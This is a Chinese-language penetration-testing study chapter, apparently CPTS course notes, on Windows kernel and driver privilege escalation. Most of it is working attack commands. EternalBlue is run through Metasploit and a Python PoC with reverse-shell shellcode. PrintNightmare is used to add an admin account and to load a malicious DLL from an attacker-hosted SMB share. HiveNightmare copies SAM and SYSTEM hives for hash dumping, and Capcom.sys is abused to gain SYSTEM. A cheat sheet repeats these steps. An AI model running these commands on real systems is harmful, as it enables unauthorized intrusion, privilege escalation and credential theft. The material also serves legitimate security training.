# 第 87 章 - Windows 核心與驅動程式

## 標籤

- #cpts
- #chapter
- #windows
- #kernel-exploit
- #privilege-escalation

## 學習目標

- 找出缺少的安全更新並配對對應的核心漏洞。
- 理解 PrintNightmare / HiveNightmare / MS17-010 的原理與利用方式。
- 知道 SeLoadDriverPrivilege 如何載入惡意驅動程式取得核心級提權。
- 能用 winPEAS / Watson / wesng 自動判斷可用的核心漏洞。

---

## 理論基礎：核心提權的原理

核心漏洞讓低權限程式碼在**核心（Ring 0）**執行，繞過所有使用者空間的存取控制。成功利用後通常直接得到 SYSTEM。

核心提權的風險：**容易造成 BSOD（Blue Screen of Death）**，在正式環境要謹慎使用。

---

## 步驟一：找缺少的 Patch

```cmd
:: 查已安裝的 hotfix（比對後可知缺少哪些）
wmic qfe list brief
:: 輸出欄位：HotFixID / InstalledOn / Description
:: 重點：記下 HotFixID 清單，去比對漏洞需求

:: 更精簡版
systeminfo | findstr /B /C:"OS Version" /C:"Hotfix(s)"

:: PowerShell 版（更易處理）
Get-HotFix | Select HotFixID, InstalledOn | Sort-Object InstalledOn -Descending
:: 按日期排序，最上面是最新的 patch
:: 缺口 = 上次 patch 時間後發布的漏洞
```

---

## 工具一：Watson（自動比對 CVE）

```powershell
# Watson：.NET 工具，自動比對已安裝 patch 對應的 CVE
.\Watson.exe
# 輸出：哪些 CVE 可能適用（顯示漏洞名稱和嚴重程度）
# 需要目標上有 .NET 3.5 或更新版本

# wesng（Kali 端，輸入 systeminfo 輸出）
# Step 1：在 Windows 取得 systeminfo 輸出
systeminfo > C:\Temp\systeminfo.txt

# Step 2：傳回 Kali，用 wesng 比對
python3 wes.py systeminfo.txt -i "Elevation of Privilege" --exploits-only
# -i "Elevation of Privilege" → 只找 PrivEsc 類型的漏洞
# --exploits-only              → 只顯示有已知 exploit 的 CVE
```

---

## 工具二：winPEAS（全面掃描）

```cmd
:: 自動掃描（包含核心漏洞提示）
.\winPEAS.exe

:: 只看 Windows Creds / System Info 部分（加快速度）
.\winPEAS.exe systeminfo
:: 輸出中找 [!] CVE 或 Possible vulnerabilities 段落

:: 彩色版（更易閱讀）
.\winPEASx64.exe
```

---

## 核心漏洞一：MS17-010 / EternalBlue（SMB RCE）

### 理論

SMBv1 的緩衝區溢位漏洞，允許遠端代碼執行（RCE），通常直接得到 SYSTEM。2017 年 NSA 洩漏工具中包含此漏洞，被 WannaCry 大規模利用。

**目標系統**：Windows 7 / Server 2008 R2 / Server 2012（未打 MS17-010 patch）

```bash
# Kali：偵測目標是否存在 EternalBlue
nmap --script smb-vuln-ms17-010 -p 445 TARGET_IP
# 輸出 VULNERABLE → 確認可利用

# Metasploit 利用（最簡單）
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set LHOST KALI_IP
run
# 成功後直接取得 NT AUTHORITY\SYSTEM shell

# 無 Metasploit 版（Python PoC）
# git clone https://github.com/3ndG4me/AutoBlue-MS17-010
python3 eternalblue_exploit7.py TARGET_IP shellcode/sc_x64_msf.bin
# shellcode → 預先用 msfvenom 生成的 reverse shell

# 偵測可用的 SMB 版本
nmap --script smb-protocols -p 445 TARGET_IP
# SMBv1: enabled → 可能存在 MS17-010
```

---

## 核心漏洞二：PrintNightmare（CVE-2021-1675 / CVE-2021-34527）

### 理論

Windows Print Spooler 服務（spoolsv.exe）以 SYSTEM 身份執行，且允許低權使用者透過 RPC 載入任意 DLL（以 SYSTEM 身份）。有兩種利用路徑：本機提權（LPE）和遠端代碼執行（RCE）。

**目標系統**：Windows 10 / Server 2019 之前未打 patch 的系統（2021 年 7 月前）

```powershell
# 確認 Print Spooler 是否執行
Get-Service Spooler
# Status: Running → 可能可利用

# 本機提權（LPE）：PowerShell PoC
# 上傳 Invoke-Nightmare.ps1 後執行
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Passw0rd!" -DriverName "PrintMe"
# -NewUser     → 要建立的管理員帳號名
# -NewPassword → 密碼
# -DriverName  → 偽裝成的驅動程式名稱（任意）
# 執行後：net localgroup Administrators 確認新帳號已加入

# 確認結果
net localgroup Administrators
# 找 hacker → 成功
```

```bash
# 遠端 RCE（需要有效帳號，透過 SMB）
# Kali：
python3 CVE-2021-1675.py DOMAIN/USER:PASS@TARGET_IP '\\KALI_IP\share\evil.dll'
# 需要先在 Kali 架設 SMB share 並放惡意 DLL

# 準備惡意 DLL（加管理員帳號）
msfvenom -p windows/x64/exec CMD="net localgroup Administrators USER /add" -f dll -o evil.dll

# 架設 SMB share
impacket-smbserver share $(pwd) -smb2support
```

---

## 核心漏洞三：HiveNightmare / SeriousSam（CVE-2021-36934）

### 理論

Windows 10 / 11 的 VSS（Volume Shadow Copy Service）對 SAM / SYSTEM / SECURITY hive 設定錯誤的 ACL，允許一般使用者讀取。可以直接讀 SAM 取得本機帳號 NT hash。

**目標系統**：Windows 10 1809+ / Windows 11（2021 年 9 月前未打 patch）

```cmd
:: 確認是否存在漏洞（檢查 SAM 的 ACL）
icacls C:\Windows\System32\config\SAM
:: 若 BUILTIN\Users:(I)(RX) → 有漏洞（一般使用者可讀）

:: 確認有 VSS snapshot（需要才能讀取）
vssadmin list shadows
:: 有 Shadow Copies 才能繼續

:: 複製 SAM / SYSTEM 從 VSS snapshot
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
:: HarddiskVolumeShadowCopy1 → 替換成實際的 shadow copy 編號

:: 傳回 Kali 解密
python3 secretsdump.py -sam SAM -system SYSTEM LOCAL
```

---

## 核心漏洞四：SeLoadDriverPrivilege → 惡意驅動程式

### 理論

`SeLoadDriverPrivilege` 允許載入核心驅動程式。透過載入一個有漏洞的合法驅動程式（如 Capcom.sys），再利用其漏洞在 Ring 0 執行任意代碼取得 SYSTEM。

```cmd
:: 確認有 SeLoadDriverPrivilege
whoami /priv | findstr SeLoadDriverPrivilege
:: 找到且 Enabled → 可利用

:: 工具：EOPLOADDRIVER（載入驅動程式用）
.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\Temp\Capcom.sys
:: System\CurrentControlSet\MyService → 登錄機碼路徑（服務名稱任意）
:: C:\Temp\Capcom.sys               → 有漏洞的驅動程式

:: 利用 Capcom.sys 的漏洞執行任意代碼（以 SYSTEM 身份）
.\ExploitCapcom.exe
:: 成功後取得 SYSTEM shell

:: 替代工具：Tarjei Mandt 的 PoC 或 PrintSpoofer（同樣利用 driver 路徑）
```

---

## 判斷邏輯

```
目標系統判斷流程：

systeminfo 和 wmic qfe list
└── Watson / wesng 比對 CVE
    │
    ├── MS17-010 可利用？
    │   └── SMBv1 開啟且未打 patch → nmap 確認 → Metasploit eternalblue
    │
    ├── PrintNightmare 可利用？
    │   └── Spooler 執行 + 未打 2021-07 patch → Invoke-Nightmare LPE
    │
    ├── HiveNightmare 可利用？
    │   └── Win10 + Users 可讀 SAM + 有 VSS → 直接複製 SAM
    │
    └── SeLoadDriverPrivilege (Enabled)？
        └── EOPLOADDRIVER + Capcom.sys → SYSTEM
```

---

## 速查表

```cmd
:: 找缺少的 patch
wmic qfe list brief
systeminfo | findstr "Hotfix"

:: wesng 比對（Kali）
python3 wes.py systeminfo.txt -i "Elevation of Privilege" --exploits-only

:: EternalBlue 偵測
nmap --script smb-vuln-ms17-010 -p 445 TARGET_IP

:: PrintNightmare LPE
Invoke-Nightmare -NewUser "hacker" -NewPassword "Passw0rd!"

:: HiveNightmare 確認
icacls C:\Windows\System32\config\SAM
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
:: Kali: python3 secretsdump.py -sam SAM -system SYSTEM LOCAL

:: SeLoadDriverPrivilege
whoami /priv | findstr SeLoadDriverPrivilege
.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\Temp\Capcom.sys
```

---

## 關聯筆記

- [[85-權杖與權限濫用|第 85 章 - 權杖與權限濫用（SeLoadDriverPrivilege）]]
- [[86-認證資料存取|第 86 章 - 認證資料存取]]
- [[82-本機列舉|第 82 章 - 本機列舉（systeminfo / wmic qfe）]]
- [[10-Volume-10-Windows-Privilege-Escalation-Index|Vol.10 - Windows PrivEsc]]
